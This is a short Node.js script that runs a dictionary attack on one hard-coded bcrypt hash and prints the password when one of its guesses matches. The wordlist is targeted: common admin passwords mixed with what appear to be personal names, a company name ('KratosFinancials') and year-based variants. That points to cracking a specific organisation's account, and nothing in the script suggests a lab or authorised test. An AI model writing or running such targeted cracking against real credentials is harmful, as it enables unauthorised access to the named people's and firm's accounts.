const bcrypt = require('bcryptjs');
const hash = '$2a$12$4U/XFk4xMIRX.Hl4lqozReP3z6owHjt25PZ0rv2WbEk1YDMI/OpnW';

const passwords = [
  'mokmoney2026!', 'Kratos2026!', 'Kratos2024!', 'admin@1234', 'qwerty1234',
  'password@123', 'P@ssw0rd', 'pass123', 'admin1234', 'admin12345', '12345',
  'superadmin', 'Administrateur', 'administrateur', 'Xavier', 'XavierNlate',
  'nlate', 'Nlate', 'mok', 'MOK', 'kratosfinancials', 'KratosFinancials',
  'Bodofia', 'Diane', 'YaO', 'YANN', 'Sonia', 'Alana', 'Ezechiel',
  'adminadmin', 'admin1'
];

console.log("Starting dictionary attack 2...");
for (let p of passwords) {
  if (bcrypt.compareSync(p, hash)) {
    console.log("SUCCESS! Password is:", p);
    process.exit(0);
  }
}
console.log("Password not found in dictionary 2.");
